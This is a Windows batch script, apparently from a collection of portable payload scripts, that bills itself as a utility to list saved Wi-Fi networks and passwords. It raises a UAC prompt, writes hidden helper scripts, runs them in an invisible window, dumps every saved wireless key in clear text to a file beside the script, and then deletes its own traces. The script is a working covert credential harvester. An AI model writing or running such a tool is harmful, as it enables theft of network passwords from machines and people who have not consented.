::::BgetDescription#List all wireless networks and passwords on the local machine.
::::BgetAuthor#b00st3d
::::BgetCategory#utilities
@echo off
NET FILE 1>NUL 2>NUL
if %errorlevel% == 0 goto elevated

REM build vbs to invoke UAC 
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute %0, "", "", "runas", 1 >> "%temp%\getadmin.vbs"

ECHO ******
ECHO Invoking UAC for Privilege Escalation 
ECHO ******

"%temp%\getadmin.vbs" >nul
exit /B

:elevated
    del "%temp%\getadmin.vbs" 2>nul     
    CD "%~dp0"
cd %~dp0
call :writeScripts
wscript.exe "invisible.vbs" "WiFi_Pass.bat"
exit

:writeScripts
rem WiFi_Pass.bat
(
echo @echo off
echo cd %%~dp0
echo del /a h "%~dp0Wireless Networks.txt" /q
echo setlocal enabledelayedexpansion
echo for /f "tokens=1* delims=:" %%%%a in ^('netsh wlan show profiles'^) do ^(
echo     set holder=%%%%b
echo     if DEFINED holder ^(
echo         set holder=!holder:~1!
echo         call :getKey !holder!
echo     ^)    
echo ^)
echo del /ah "invisible.vbs" /q 2>nul
echo del /ah "WiFi_Pass.bat" /q 2>nul
echo exit
echo :getKey
echo set ssid=%%1
echo set key=null
echo netsh wlan show profile name="!ssid!" key=clear ^| FIND "Key Content" ^> %%temp%%\bd
echo for /f "tokens=1* delims=:" %%%%a in ^(%%temp%%\bd^) do ^(
echo     if not "%%%%b"=="" set key=%%%%b
echo     if not !key!==null ^(
echo         set key=!key:~1!
echo         echo SSID: !ssid! ^>^> "%~dp0Wireless Networks.txt"
echo         echo KEY: !key! ^>^> "%~dp0Wireless Networks.txt"
echo         echo ====== ^>^> "%~dp0Wireless Networks.txt"
echo     ^)
echo ^)
echo if !key!==null ^(
echo     echo SSID: !ssid! ^>^> "%~dp0Wireless Networks.txt"
echo     echo KEY: Open Network ^>^> "%~dp0Wireless Networks.txt"
echo     echo ====== ^>^> "%~dp0Wireless Networks.txt"
echo     ^)
echo del %%temp%%\bd /q 2^>nul
REM echo attrib "%~dp0Wireless Networks.txt" +h
echo exit /b
) >WiFi_Pass.bat

rem invisible.vbs
echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """", 0, False >invisible.vbs
attrib WiFi_Pass.bat +h
attrib invisible.vbs +h
exit /b